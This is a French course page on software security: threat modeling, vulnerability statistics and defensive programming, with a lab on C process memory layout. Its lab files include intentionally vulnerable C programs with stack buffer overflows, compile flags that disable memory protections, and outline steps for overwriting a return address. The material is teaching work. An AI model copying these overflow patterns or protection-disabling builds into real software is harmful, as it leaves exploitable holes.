<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="author" content="Choquet Olivier & Vandenheede Driss">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Software Security - Suppléments - e-Syllabus HTML5 et CSS3</title>
        <!-- une icône dans la barre du navigateur -->
        <link rel="icon" href="../images/favicon.png" type="image/png">
        <link rel="stylesheet" href="../style.css">
    </head>
    <body>
        <!-- liens d'évitement -->
        <ul class="a11y-nav">
            <li>
                <a href="#container">Passer directement au contenu</a>
            </li>
            <li>
                <a href="#menu">Accéder au menu secondaire de la page</a>
            </li>
            <li>
                <a href="#aside">Accéder aux liens utiles</a>
            </li>
        </ul>
        
        <!-- bannière et menu -->
        <header role="banner">
            <div class="logoTitle">
                <h1>Cours d'introduction au Web</h1>
                <h2>HTML5 et CSS3</h2>
            </div>
            <nav role="navigation" aria-label="Menu principal de navigation">
                <ul>
                    <li><a href="../index.html">Le cours</a></li>
                    <li><a href="../internet.html">Internet</a></li>
                    <li><a href="../html5.html">HTML5</a></li>
                    <li><a href="../css3.html">CSS3</a></li>
                    <li><a href="../methodologie.html">Méthodologie</a></li>
                    <li><a href="../lexique.html">Lexique</a></li>
                    <li><a href="../supplements.html" class="current">Suppléments</a></li>
                </ul>
            </nav>
        </header>

        <div id="menu">
            <nav role="navigation" aria-label="Menu secondaire">
                <ol>
                    <li><a href="supplements_ITSCM.html">Retour au sommaire</a></li>
                    <li><a href="#comprendre_menaces_modeles_attaques">Comprendre les menaces et les modèles d'attaques</a></li>
                    <li><a href="#typologie_menaces">Typologie des menaces</a></li>
                    <li><a href="#definitions_cles">Définitions clés</a></li>
                    <li><a href="#failles_vulnerabilites_logiciels">Failles et vulnérabilités des logiciels</a></li>
                    <li><a href="#faille_securite">Faille de sécurité</a></li>
                    <li><a href="#reduire_vulnerabilites_logicielles">Réduire les vulnérabilités logicielles</a></li>
                    <li><a href="#programmation_defensive">Programmation défensive</a></li>
                    <li><a href="#lab1">Lab 1 : Environnement d'exécution</a></li>
                    <li><a href="#security_by_design">Security by Design</a></li>
                    <li><a href="#gcc">GCC</a></li>
                    <li><a href="#OWASP_Top10_Lab_Setup">OWASP Top 10 Lab Setup</a></li>
                    <li><a href="#travaux_individuels_OWAP_Top_10">Travaux individuels - OWASP Top 10 (2021)</a></li>
                    <li><a href="#laboC">Labo C - Compilation, édition de liens, debugging & sécurité mémoire</a></li>
                    <li><a href="#memlab">Labo memlab</a></li>
                </ol>
            </nav>
            
            <!-- aside lié à la page et pas à l'article donc pas à l'intérieur de article -->
            <aside id="aside" role="complementary">
                <p>Liens utiles :</p>
                <ul>
                    <li><a href="https://www.youtube.com/c/LeDesignerduWeb/videos">Le Designer du web</a></li>
                    <li><a href="https://owasp.org/Top10/2021/A00_2021_Introduction/index.html" target="_blank">OWASP Top 10 - 2021</a></li>
                    <li><a href="https://cwe.mitre.org/" target="_blank">CWE MIRE (Common Weakness Enumeration)</a></li>
                </ul>
            </aside>
        </div>
        
        <main id="container" role="main" tabindex="-1">
            <section id="mainSection">
                <article>
                    <h1>Software Security :</h1>
                </article>
                <article>
                    <h2 id="comprendre_menaces_modeles_attaques">Comprendre les menaces et les modèles d'attaques :</h2>
                    <p><q lang="en">You can't defend what you don't understand</q></p>
                    <p>Exemple : Threat Modeling, STRIDE, DREAD, MITRE ATT&CK</p>
                    <h3>Pourquoi comprendre les menaces ?</h3>
                    <ol>
                        <li>
                            <h4>Anticiper au lieu de subir :</h4>
                            <p>Comprendre les menaces, c'est <span class="em">penser comme un attaquant</span> pour anticiper les vecteurs d'exploitation possibles. Cela permet de :</p>
                            <ul>
                                <li>
                                    <p>Identifier les <span class="em">actifs critiques</span> avant qu'ils ne soient ciblés.</p>
                                </li>
                                <li>
                                    <p>Réduire les <span class="em">surfaces d'attaque</span> avant même la mise en production.</p>
                                </li>
                                <li>
                                    <p>Prioriser les contrôles de sécurité selon les <span class="em">risques réels</span>.</p>
                                </li>
                            </ul>
                            <p>Exemple : Une application Web sans analyse de menace risque d'ignorer que des formulaires d'authentification peuvent subir du brute force ou du credential stuffing.</p>
                        </li>
                        <li>
                            <h4>Intégrer la sécurité dès la conception (Shift Left) :</h4>
                            <p>Comprendre les menaces permet de <span class="em">concevoir un logiciel résilient</span> dès les premières phases du SDLC (Software Development Life Cycle).</p>
                            <ul>
                                <li>
                                    <p>Les <span class="em">architectes</span> peuvent modéliser les menaces via <span class="em">DFD + STRIDE</span>.</p>
                                </li>
                                <li>
                                    <p>Les <span class="em">développeurs</span> peuvent intégrer des contre-mesures directement dans le code.</p>
                                </li>
                                <li>
                                    <p>Les <span class="em">testeurs</span> peuvent dériver des scénarios de test à partir des menaces connues.</p>
                                </li>
                                <li>
                                    <p>Outils utilisés :</p>
                                    <p>OWASP Threat Dragon, Microsoft Threat Modeling Tool, IriusRisk</p>
                                    <p>MITRE ATT&CK (pour mapping des TTP)</p>
                                </li>
                            </ul>
                            <p>STRIDE est un modèle développé par Microsoft pour <span class="em">classer les types de menaces</span>.</p>
                            <table class="tableBalises">
                                <thead>
                                    <tr>
                                        <th>Lettre</th>
                                        <th>Menace</th>
                                        <th>Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>S</td>
                                        <td>Spoofing</td>
                                        <td>Usurpation d'identité</td>
                                    </tr>
                                    <tr>
                                        <td>T</td>
                                        <td>Tampering</td>
                                        <td>Altération des données</td>
                                    </tr>
                                    <tr>
                                        <td>R</td>
                                        <td>Repudiation</td>
                                        <td>Négation d'actions</td>
                                    </tr>
                                    <tr>
                                        <td>I</td>
                                        <td>Information Disclosure</td>
                                        <td>Divulgation d'informations</td>
                                    </tr>
                                    <tr>
                                        <td>D</td>
                                        <td>Denial of Service</td>
                                        <td>Déni de service</td>
                                    </tr>
                                    <tr>
                                        <td>E</td>
                                        <td>Elevation of Privilege</td>
                                        <td>Élévation de privilèges</td>
                                    </tr>
                                </tbody>
                            </table>
                            <p>MITRE ATT&amp;CK est une <span class="em">base de connaissances</span> décrivant les <span class="em">techniques d'attaques réelles</span> utilisées par des attaquants observés dans la nature.</p>
                            <p>La <span class="em">modélisation des menaces (Threat Modeling)</span> vise à répondre à quatre questions essentielles :</p>
                            <ol>
                                <li>
                                    <p><span class="em">Qu'est-ce que je protège ?</span> (actifs, données, systèmes)</p>
                                </li>
                                <li>
                                    <p><span class="em">Contre qui ?</span> (attaquant interne, externe, opportuniste, APT)</p>
                                </li>
                                <li>
                                    <p><span class="em">Comment peut-on m'attaquer ?</span> (vecteurs d'attaque)</p>
                                </li>
                                <li>
                                    <p><span class="em">Quelles protections mettre en place ?</span></p>
                                </li>
                            </ol>
                            <p>Elle permet une <span class="em">sécurité proactive</span>, et non réactive.</p>
                            <p>C'est une méthode structurée permettant :</p>
                            <ul>
                                <li>
                                    <p>d'identifier les menaces</p>
                                </li>
                                <li>
                                    <p>d'analyser les failles potentielles</p>
                                </li>
                                <li>
                                    <p>de prioriser les risques</p>
                                </li>
                                <li>
                                    <p>de concevoir des contre-mesures adaptées</p>
                                </li>
                            </ul>
                            <p>Elle est utilisée <span class="em">avant</span>, <span class="em">pendant</span> et <span class="em">après</span> la conception d'un système.</p>
                            <p>DREAD est un modèle de <span class="em">scoring</span> permetant d'évaluer la <span class="em">gravité d'une menace</span>.</p>
                            <table class="tableBalises">
                                <thead>
                                    <tr>
                                        <th>Critère</th>
                                        <th>Signification</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td><span class="em">D</span>amage</td>
                                        <td>Impact potentiel</td>
                                    </tr>
                                    <tr>
                                        <td><span class="em">R</span>eproducibility</td>
                                        <td>Facilité de reproduction</td>
                                    </tr>
                                    <tr>
                                        <td><span class="em">E</span>xploitability</td>
                                        <td>Facilité d'exploitation</td>
                                    </tr>
                                    <tr>
                                        <td><span class="em">A</span>ffected users</td>
                                        <td>Nombre d'utilisateurs impactés</td>
                                    </tr>
                                    <tr>
                                        <td><span class="em">D</span>iscoverability</td>
                                        <td>Facilité de découverte.</td>
                                    </tr>
                                </tbody>
                            </table>
                            <p>Chaque critère est noté (par exemple : 1 à 10).</p>
                            <p>DREAD répond à la question : <q class="em">Quelle menace est la plus critique ?</q> Il aide à <span class="em">prioriser</span> les actions de sécurité.</p>
                        </li>
                        <li>
                            <h4>Améliorer la priorisation et la gestion des risques :</h4>
                            <p>Comprendre les menaces aide à <span class="em">hiérarchiser les efforts de sécurité</span>.</p>
                            <p>Toutes les vulnérabilités ne se valent pas : une faille de configuration mineure n'a pas le même impact qu'une injection RCE.</p>
                            <p>Exemple pratique :</p>
                            <table class="tableBalises">
                                <thead>
                                    <tr>
                                        <th>Vulnérabilité</th>
                                        <th>Impact</th>
                                        <th>Probabilité</th>
                                        <th>Risque global</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>XSS sur page interne</td>
                                        <td>Moyen</td>
                                        <td>Faible</td>
                                        <td>Moyen</td>
                                    </tr>
                                    <tr>
                                        <td>Insecure Deserialization</td>
                                        <td class="em">Élevé</td>
                                        <td>Moyen</td>
                                        <td class="em">Élevé</td>
                                    </tr>
                                </tbody>
                            </table>
                        </li>
                        <li>
                            <h4>Favoriser la communication inter-équipes :</h4>
                            <p>Les modèles de menaces servent de langage commun entre Développeurs, Architectes, DevOps/SecOps et Auditeurs et RSSI</p>
                            <p>Cela favorise la culture sécurité et réduit les malentendus : tout le monde parle en termes de menace, impact, scénario d'attaque, contre-mesure.</p>
                        </li>
                        <li>
                            <h4>Se conformer aux normes et référentiels :</h4>
                            <p>Les frameworks exigent une compréhension claire des menaces :</p>
                            <ul>
                                <li>
                                    <p>ISO 27034 (Application Security).</p>
                                </li>
                                <li>
                                    <p>NIST SSDF (Secure Software Development Framework).</p>
                                </li>
                                <li>
                                    <p>OWASP SAMM (Threat Assessment).</p>
                                </li>
                                <li>
                                    <p>NIS2 / ENISA Guidelines (Supply chain threat modeling).</p>
                                </li>
                            </ul>
                            <p>Sans modélisation de menace, il est impossible de démontrer la conformité à ces cadres.</p>
                        </li>
                        <li>
                            <h4>Réduire les coûts de correction :</h4>
                            <p>Une menace identifiée <span class="em">tôt</span> coûte 30 à 100 fois moins cher à corriger qu'en production.</p>
                            <p>Exemple :</p>
                            <p>Correction d'un XSS détecté à la conception &#8594; 100€</p>
                            <p>Correction après compromission &#8594; 10000€ +</p>
                            <img src="../images/cout_correction_defaut_phase_developpement.PNG" alt="">
                            <p>SRC : IBM System Science Institute : Relative Cost of Fixing Defects</p>
                        </li>
                    </ol>
                </article>
                <article>
                    <h2 id="typologie_menaces">Typologie des menaces :</h2>
                    <ul>
                        <li>
                            <p>Attaques <span class="em">logicielles</span> : injection, corruption mémoire, logique métier</p>
                        </li>
                        <li>
                            <p>Attaques <span class="em">infrastructurelles</span> : réseau, système, container</p>
                        </li>
                        <li>
                            <p>Attaques <span class="em">supply chain / open source</span> : Exemples réels : SolarWinds, Log4Shell, XZ backdoor</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="definitions_cles">Définitions clés :</h2>
                    <table class="tableBalises">
                        <thead>
                            <tr>
                                <th>Élément</th>
                                <th>Définition</th>
                                <th>Exemple concret</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td class="em">Actif</td>
                                <td>Ce qu'on cherche à protéger (donnée, service, identité, code)</td>
                                <td>Base de données clients</td>
                            </tr>
                            <tr>
                                <td class="em">Menace</td>
                                <td>Intention ou événement malveillant exploitant une faille</td>
                                <td>Attaquant injectant du code SQL</td>
                            </tr>
                            <tr>
                                <td class="em">Vulnérabilité</td>
                                <td>Faiblesse technique ou logique exploitable</td>
                                <td>Entrée utilisateur non filtrée</td>
                            </tr>
                            <tr>
                                <td class="em">Impact</td>
                                <td>Conséquence si la menace se réalise</td>
                                <td>Vol de données, compromission</td>
                            </tr>
                            <tr>
                                <td class="em">Risque</td>
                                <td>Combinaison probabilité x impact</td>
                                <td>Risque élevé de fuite de données</td>
                            </tr>
                        </tbody>
                    </table>
                    <img src="../images/chaine_logique_menace_risque.PNG" alt="">
                    <h3>Common Weakness Enumeration - Top 25 -2024 :</h3>
                    <div>
                        <figure>
                            <img src="../images/CWE_MITRE_TOP_25_2024.PNG" alt="" class="float_left">
                            <figcaption>
                                <p>Table 1</p>
                                <p><a href="https://cwe.mitre.org/" target="_blank">CWE/MITRE TOP 25 Most Dangerous Software Weaknesses (2024)</a></p>
                            </figcaption>
                        </figure>
                    </div>
                </article>
                <article>
                    <h2 id="failles_vulnerabilites_logiciels">Failles et vulnérabilités des logiciels :</h2>
                    <p>Les failles critiques de sécurité des applications web comprennent 5 failles liées à un code non sécurisé :</p>
                    <ul>
                        <li>
                            <p>Entrées non validées (en C)</p>
                        </li>
                        <li>
                            <p>Cross-site scripting</p>
                        </li>
                        <li>
                            <p>Buffer overflow (en C)</p>
                        </li>
                        <li>
                            <p>Failles d'injection</p>
                        </li>
                        <li>
                            <p>Gestion incorrecte des erreurs</p>
                        </li>
                    </ul>
                    <p>Ces failles sont le résultat d'une vérification et d'une validation insuffisante des données et des codes d'erreur dans les programmes.</p>
                    <p>La prise de conscience de ces problèmes est une première étape essentielle pour écrire un code plus sécurisé.</p>
                    <p>Il est important de souligner la nécessité pour les développeurs de se pencher sur ces failles préoccuppantes et connues.</p>
                    <figure>
                        <img src="../images/failles_vulnerabilites_logiciels.PNG" alt="">
                        <figcaption>Source : <a href="https://gbhackers.com" target="_blank">https://gbhackers.com</a></figcaption>
                    </figure>
                </article>
                <article>
                    <h2 id="faille_securite">Faille de sécurité :</h2>
                    <p>Chaque faille représente un écart entre l'intention du développeur et le comportement réel du logiciel face à un attaquant.</p>
                    <figure>
                        <img src="../images/vulnerabilities_by_type.PNG" alt="">
                        <figcaption>Source : <a href="https://www.cvedetails.com/vulnerabilities-by-types.php" target="_blank">https://www.cvedetails.com/vulnerabilities-by-types.php</a></figcaption>
                    </figure>
                    <p>Chaque faille représente un écart entre l'intention du développeur et le comportement réel du logiciel face à un attaquant. Selon le site <a href="https://www.cvedetails.com" target="_blank">www.cvedetails.com</a> en 2024, le total des failles recensées était de 40303.</p>
                    <figure>
                        <img src="../images/vulnerabilities_by_type_year.PNG" alt="">
                        <figcaption>Source : <a href="https://www.cvedetails.com/vulnerabilities-by-types.php" target="_blank">https://www.cvedetails.com/vulnerabilities-by-types.php</a></figcaption>
                    </figure>
                    <p>En 2024, le total des failles recensées était de 40303, dont 7443 XSS et 2645 SQLi. Début octobre 2025, on recense 36705 failles et, à la fin de l'année 2025, on projette un nombre de failles proches de 50000.</p>
                    <figure>
                        <img src="../images/vulnerabilities_by_types_categories.PNG" alt="">
                        <figcaption>Source : <a href="https://www.cvedetails.com/vulnerabilities-by-types.php" target="_blank">https://www.cvedetails.com/vulnerabilities-by-types.php</a></figcaption>
                    </figure>
                </article>
                <article>
                    <h2 id="reduire_vulnerabilites_logicielles">Réduire les vulnérabilités logicielles :</h2>
                    <p>Le framework NIST SSDF présente une série d'approches visant à réduire le nombre de vulnérabilités logicielles (voir NIST-SP 800-218).</p>
                    <p>Il recommande :</p>
                    <ul>
                        <li>
                            <p>D'empêcher les vulnérabilités avant qu'elles ne surviennent en utilisant des méthodes améliorées pour spécifier et développer les logiciels.</p>
                        </li>
                        <li>
                            <p>De détecter les vulnérabilités avant qu'elles ne puissent être exploitées en utilisant des techniques de test plus efficaces.</p>
                        </li>
                        <li>
                            <p>De réduire l'impact des vulnérabilités en développant des architectures logicielles plus résilientes.</p>
                        </li>
                    </ul>
                    <h3>NIST-SP 800-218 :</h3>
                    <img src="../images/NIST-SP_800-218.PNG" alt="">
                    <p><a href="../files/nist.sp.800-218.ssdf-table.xlsx">Tableau NIST-SP 800-218 (en Excel)</a></p>
                    <h3>Qualité et fiabilité des logiciels :</h3>
                    <ul>
                        <li>
                            <p>Éviter toute défaillance accidentelle résultant d'une entrée théoriquement aléatoire et imprévue, ou d'une imprévue, ou d'une intéraction non contrôlée avec le système, ou utiliser un code incorrect (logique incorrecte).</p>
                        </li>
                        <li>
                            <p>Améliorer à l'aide d'un design structuré et de tests afin d'identifier et éliminer autant de bugs que possible dans un programme.</p>
                        </li>
                        <li>
                            <p>La préoccupation ne porte pas sur le nombre de bugs, mais sur la fréquence à laquelle ils se déclenchent.</p>
                        </li>
                    </ul>
                    <h3>Failles et vulnérabilités :</h3>
                    <ul>
                        <li>
                            <p>L'attaquant cible spécifiquement les bugs qui provoquent une défaillance pouvant être exploitée (par l'attaquant).</p>
                        </li>
                        <li>
                            <p>Déclenchées par des entrées qui diffèrent considérablement de ce qui est habituellement attendues.</p>
                        </li>
                        <li>
                            <p>Peu susceptible d'être identifié par les méthodes d'analyse courantes.</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="programmation_defensive">Programmation défensive :</h2>
                    <ul>
                        <li>
                            <p>Concevoir et mettre en oeuvre des logiciels de manière à ce qu'ils continuent de fonctionner même lorsqu'ils sont attaqués.</p>
                        </li>
                        <li>
                            <p>Exige de prêter attention à tous les aspects de l'exécution du programme, à l'environnement et au type de données qu'il traite.</p>
                        </li>
                        <li>
                            <p>Le logiciel est capable de détecter les conditions erronées résultant d'une attaque.</p>
                        </li>
                        <li>
                            <p>Également appelé "programmation sécurisée".</p>
                        </li>
                        <li>
                            <p>La règle d'or est de ne jamais présumer de quoi que ce soit, de vérifier toutes les hypothèses et de gérer tous les états d'erreur possibles.</p>
                        </li>
                        <li>
                            <p>Les programmeurs émettent souvent des hypothèses sur le type d'entrées qu'un programme recevra et l'environnement dans lequel il s'exécutera.</p>
                            <p>Ces hypothèses doivent être validées par le programme et toutes les défaillances potentielles doivent être gérées avec sécurité.</p>
                        </li>
                        <li>
                            <p>Nécissite un changement de mentalité par rapport aux pratiques de programmation traditionnelles.</p>
                            <p>Les programmeurs doivent comprendre comment les défaillances peuvent se produire et les mesures à prendre pour réduire le risque qu'elles se produisent dans leurs programmes.</p>
                        </li>
                        <li>
                            <p>Danger !!! Les conflits avec les pressions commerciales visant à réduire au maximum les délais de développement afin de maximiser l'avantage concurrentiel.</p>
                        </li>
                    </ul>
                    <h3>Environnement d'un programme :</h3>
                    <img src="../images/environnement_programme.PNG" alt="">
                    <ul>
                        <li>
                            <p>Pratique !</p>
                        </li>
                        <li>
                            <p>Préparation d'un environnement de test !</p>
                        </li>
                        <li>
                            <p>Chaîne de compilation en C.</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="lab1">Lab 1 : Environnement d'exécution :</h2>
                    <p>Objectif : comprendre comment un programme vit en mémoire.</p>
                    <p>Qu'est-ce qu'un environnement d'exécution ?</p>
                    <p>C'est un ensemble des ressources allouées à un programme (mémoire, registres CPU, pile, tas...).</p>
                    <h3>Vue d'ensemble de la mémoire d'un processus :</h3>
                    <img src="../images/vue_ensemble_memoire_processus.PNG" alt="">
                    <h3>Les registres CPU :</h3>
                    <img src="../images/registres_CPU.PNG" alt="">
                    <h3>Vue d'ensemble de la mémoire d'un processus :</h3>
                    <img src="../images/vue_ensemble_memoire_processus.PNG" alt="">
                    <h3>Le segment de code :</h3>
                    <ul>
                        <li>
                            <p>Contient les instructions compilées du programme.</p>
                        </li>
                        <li>
                            <p>En lecture seule.</p>
                        </li>
                        <li>
                            <p>Exemple : sections ELF (.text, .rodata).</p>
                        </li>
                        <li>
                            <p>Exercice : compiler et vérifier les sections dans un exécutable (<span class="em">readelf</span>, <span class="em">objdump</span>).</p>
                        </li>
                    </ul>
                    <h3>Les segments de données (Data & BSS) :</h3>
                    <ul>
                        <li>
                            <p>Data : variables globales initialisées.</p>
                        </li>
                        <li>
                            <p>BSS : variables non initialisées.</p>
                        </li>
                        <li>
                            <p>Exemple C :</p>
<pre><code>int global_init = 10; // Data
int global_uninit; // BSS</code></pre>
                        </li>
                    </ul>
                    <h3>Le tas (Heap) :</h3>
                    <ul>
                        <li>
                            <p>Zone mémoire dynamique (malloc, calloc, new...).</p>
                        </li>
                        <li>
                            <p>Croît vers le haut.</p>
                        </li>
                        <li>
                            <p>Vulnérabilités : Heap overflow, Use-After-Free, Double Free.</p>
                        </li>
                    </ul>
                    <h3>La pile (Stack) :</h3>
                    <ul>
                        <li>
                            <p>Stocke les variables locales et le contexte d'appel.</p>
                        </li>
                        <li>
                            <p>Croît vers le bas.</p>
                        </li>
                        <li>
                            <p>Structure d'une stack frame :</p>
                            <img src="../images/pile_stack.PNG" alt="">
                            <img src="../images/pile_stack_1.PNG" alt="">
                        </li>
                    </ul>
                    <h3>Les registres CPU :</h3>
                    <ul>
                        <li>
                            <p>EIP/RIP : pointeur d'instruction</p>
                        </li>
                        <li>
                            <p>ESP/RSP : pointeur de pile</p>
                        </li>
                        <li>
                            <p>EBP/RBP : base frame</p>
                        </li>
                        <li>
                            <p>EAX, EBX... : registres de travail</p>
                        </li>
                        <li>
                            <p>Exemple ASM :</p>
                            <div>
                                <img src="../images/registres_CPU_1.PNG" class="float_right" alt="">
<pre><code>push ebp
mov ebp, esp
sub esp, 0x10
mov eax, [ebp+8]
leave
ret</code></pre>
                            </div>
                        </li>
                    </ul>
                    <h3>Stack vs Heap :</h3>
                    <ul>
                        <li>
                            <p>Stack : allocation auto, rapide, taille limitée, vulnérable aux overflows.</p>
                        </li>
                        <li>
                            <p>Heap : allocation dynamique, grande, lente, vulnérable aux use-after-free.</p>
                        </li>
                    </ul>
                    <h3>Mécanismes de protection mémoire :</h3>
                    <ul>
                        <li>
                            <p>ASLR : randomisation des adresses</p>
                        </li>
                        <li>
                            <p>DEP/NX bit : empêche exécution sur pile/tas.</p>
                        </li>
                        <li>
                            <p>Stack canaries : détecte les écrasements de pile.</p>
                        </li>
                    </ul>
                    <h3>Étude pratique :</h3>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int global = 5;
int main() {
    int local = 10;
    int *p = malloc(sizeof(int));
    *p = 20;
    printf("%p %p %p\n", &amp;global, &amp;local, p);
    free(p);
}</code></pre>
                    <h3>Exemple pratique : sections mémoire d'un programme C :</h3>
                    <p>Voici un exemple simple en C illustrant les différentes sections mémoire :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

/*gcc -o env_mem_demo env_mem_demo.c
./env_mem_demo */

int global_init = 42; // Segment Data
int global_uninit; // Segment BSS

void function_demo() {
    int local_var = 5; // Stack
    int *heap_var = malloc(sizeof(int));
    *heap_var = 99; // Heap

    printf("Adresse Code (function_demo) : %p\n", function_demo);
    printf("Adresse Data (global_init) : %p\n", &amp;global_init);
    printf("Adresse BSS (global_uninit) : %p\n", &amp;global_uninit);
    printf("Adresse Stack (local_var) : %p\n", &amp;local_var);
    printf("Adresse Heap (*heap_var) : %p\n", heap_var);

    free(heap_var);
}

int main() {
    function_demo();
    return 0;
}</code></pre>
                    <h3>Analyse et visualisation mémoire :</h3>
                    <ul>
                        <li>
                            <p>Exemple de sortie de commande :</p>
<pre><code>$ size env_mem_demo
text data bss dec  hex filename
1024 12   8   1044 414 env_mem_demo</code></pre>
                            <p>`.text` : code exécutable (instructions)</p>
                            <p>`.data` : variables globales initialisées</p>
                            <p>`.bss` : variables globales non initialisées</p>
                        </li>
                        <li>
                            <p>Heap : mémoire dynamique via malloc()</p>
                        </li>
                        <li>
                            <p>Stack : variables locales et adresses de retour</p>
                        </li>
                    </ul>
                    <h3>Conclusion :</h3>
                    <ul>
                        <li>
                            <p>L'environnement d'exécution est la base de la sécurité mémoire.</p>
                        </li>
                        <li>
                            <p>Comprendre le CPU, la pile et le tas.</p>
                        </li>
                        <li>
                            <p>Indispensable pour debugging, reverse engineering et exploitation.</p>
                        </li>
                    </ul>
                    <h4>Les différents fichiers du labo 1 sont :</h4>
                    <ol>
                        <li>
                            <p>Le fichier `<span class="em">env_mem_demo.c</span>` :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

/* gcc -o env_mem_demo env_mem_demo.c
./env_mem_demo */

int global_init = 42; // Segment Data
int global_uninit; // Segment BSS

void function_demo() {	
    int local_var = 5; // Stack
    int *heap_var = malloc(sizeof(int));
    *heap_var = 99; // Heap

    printf("Adresse Code (function_demo) : %p\n", function_demo);
    printf("Adresse Data (global_init) : %p\n", &amp;global_init);
    printf("Adresse BSS (global_uninit) : %p\n", &amp;global_uninit);
    printf("Adresse Stack (local_var) : %p\n", &amp;local_var);
    printf("Adresse Heap (*heap_var) : %p\n", heap_var);

    free(heap_var);
}

int main() {
    function_demo();
    return 0;
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">banner.c</span>` :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void print_banner(const char *name) {
    char buffer[16];
    strcpy(buffer, name); // vulnérable
    printf("Hello, %s", buffer);
}

int main(int argc, char *argv[]) {
    int secret = 0x41424344;
    print_banner(argv[1]);
    printf("Secret after call: 0x%X", secret);
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">mem_layout_demo.c</span>` :</p>
<pre><code>/* mem_layout_demo.c
* Petit programme pédagogique pour afficher adresses mémoire
* (text / rodata / data / bss / heap / stack / adresses de fonctions).
*
* Compilez avec : gcc -g -O0 mem_layout_demo.c -o mem_layout_demo
* (l'option -g permet l'inspection avec gdb ; -O0 évite les optimisations qui
*  déplaceraient ou supprimeraient certaines variables locales).
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

/* Segments globaux */
int initialized_global = 0x11223344;   /* segment .data (initialisé) */
int uninitialized_global;              /* segment .bss (non-initialisé) */

const char *const_string = "Hello, readonly data (rodata)";

void callee(int depth);

/* fonction utile pour afficher adresses de fonctions */
void dummy_function(void) { /* vide */ }

int main(void) {
    int local_main = 0xdeadbeef;      /* variable locale (stack) */
    void *heap_ptr = malloc(64);      /* alloue sur le heap */

    printf("=== Disposition mémoire (exemple) ===\n\n");

    /* adresses du segment code / fonctions */
    printf("Adresse de la fonction main()      : %p\n", (void*)main);
    printf("Adresse de la fonction callee()    : %p\n", (void*)callee);
    printf("Adresse de dummy_function()        : %p\n", (void*)dummy_function);

    /* rodata / data / bss */
    printf("\nSegments statiques:\n");
    printf(" Adresse de la chaîne (rodata)     : %p -&gt; \"%s\"\n", (void*)const_string, const_string);
    printf(" Adresse initialized_global (.data) : %p -&gt; 0x%X\n", (void*)&initialized_global, initialized_global);
    printf(" Adresse uninitialized_global (.bss) : %p -&gt; 0x%X\n", (void*)&uninitialized_global, uninitialized_global);

    /* heap et stack */
    printf("\nHeap & Stack:\n");
    printf(" Adresse heap (malloc 64 bytes)     : %p\n", heap_ptr);
    printf(" Adresse variable locale main (stack): %p -&gt; 0x%X\n", (void*)&local_main, local_main);

    /* adresse retour approximative (non portable mais pédagogique) */
    void *ret_addr = __builtin_return_address(0);
    printf("\nAdresse de retour (valeur fournie par __builtin_return_address(0)) : %p\n", ret_addr);

    /* appeler callee qui fera afficher adresses supplémentaires (empilement) */
    callee(1);

    free(heap_ptr);
    return 0;
}

void callee(int depth) {
    int local_callee = 0xfeedface;
    printf("\n-- dans callee(depth=%d) --\n", depth);
    printf(" Adresse local callee (stack)       : %p -&gt; 0x%X\n", (void*)&local_callee, local_callee);
    printf(" Adresse return (callee) via builtin: %p\n", __builtin_return_address(0));

    if (depth &lt; 2) {
        /* récursion contrôlée pour montrer plusieurs frames */
        callee(depth + 1);
    }
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">vuln.c</span>` :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void secret() {
    printf("Bravo !  - vous avez decouvert secret()!\n");
    fflush(stdout);
}

void vuln() {
    char buf[16];
    printf("Tapez quelque chose:\n");
    fgets(buf, 512, stdin); // vulnérabilité intentionelle overflow
    printf("Vous avez introduit : %s\n", buf);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">lab1_buffer_overflow.md</span>` :</p>
<pre><code># Lab 1 — Buffer Overflow (C)
## Objectifs
- Comprendre la pile, ret address overwrite
## Environnement
- Compiler: `<span class="em">gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie</span>`
# -z execstack est une option du linker ELF (Linux) qui demande une pile exécutable.
# Sous Windows (format PE) la notion est différente et lld/ld du toolchain MinGW ne reconnaît pas le-z.
- Outils: <span class="em">gdb</span>, <span class="em">pwntools</span>
## Étapes (résumé)
1. Trouver offset (pattern_create/pattern_offset)
2. Overwrite retour avec adresse de `<span class="em">secret()</span>`
3. Vérifier protections (ASLR) et disabled protections pour la démo</code></pre>
                        </li>
                    </ol>
                </article>
                <article>
                    <h2 id="security_by_design">Security by Design :</h2>
                    <p>La sécurité et la fiabilité sont des objectifs de conception courants dans la plupart des disciplines d'ingénierie.</p>
                    <p>Ces dernières années, des efforts croissants ont été déployés pour améliorer les processus de développement logiciel sécurisé.</p>
                    <p>La Software Assurance Forum for Excellence in Code (SAFECode) élabore des publications décrivant les meilleures pratiques de l'industrie en matière d'assurance logicielle et fournissant des conseils pratiques pour la mise en oeuvre de méthodes éprouvées de développement logiciel sécurisé.</p>
                    <h3>Traitement des entrées du programme :</h3>
                    <img src="../images/traitement_entrees_programme.PNG" alt="">
                    <h3>Taille des entrées &amp; Débordement de tampon :</h3>
                    <p>Les programmeurs font souvent des hypothèses sur la taille maximale attendue des entrées.</p>
                    <p>La taille allouée au tampon n'est pas confirmée/validée.</p>
                    <p>Il en résulte un débordement de tampon (buffer offervlow).</p>
                    <p>Les tests peuvent ne pas identifier la vulnérabilité.</p>
